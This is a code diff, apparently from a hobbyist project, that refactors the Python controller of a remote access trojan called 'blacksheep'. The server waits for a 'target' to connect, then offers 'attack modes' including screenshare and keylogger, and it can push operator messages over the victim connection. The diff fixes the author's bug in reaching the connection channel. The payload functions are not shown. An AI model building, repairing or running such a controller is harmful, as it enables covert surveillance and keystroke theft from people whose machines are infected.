@@ -17,17 +17,15 @@ class Server:
             print("host - port binding was successfull..\n")
             self.waiting()#CALLED THE WAITING METHOD
         except socket.error as err:
+            print("binding error", err)
             #incase of socket error we will call the function again
-            self.binding()
-        except OSError as err:
-            print("NOT COMPATIBLE", err)
 
     def waiting(self):#waiting for the target to connect to blacksheep
         try:
             print("waiting for connection...")
             self.channel, self.address = self.route.accept()
             print("connection was established")
-            AttackModes().attack_modes()
+            self.attack_modes()
         except socket.error as err:
             self.waiting()
         except KeyboardInterrupt:
@@ -44,11 +42,6 @@ class Server:
 #server code stops here
 
 #ATTACK MODES STARTS HERE...................................
-class AttackModes:
-    def __init__(self):
-        pass
-
-#what to see from client
     def attack_modes(self):
         print("1: screenshare")
         print("2: Keylogger")
@@ -121,7 +114,7 @@ class AttackModes:
     def chat(self):
         while True:
             self.test = input(">> ").encode("utf-8")
-            Server().channel.send(self.test)#here is where i cannot call the chanell var
+            self.channel.send(self.test)
 
 f = Server()
 f.main()
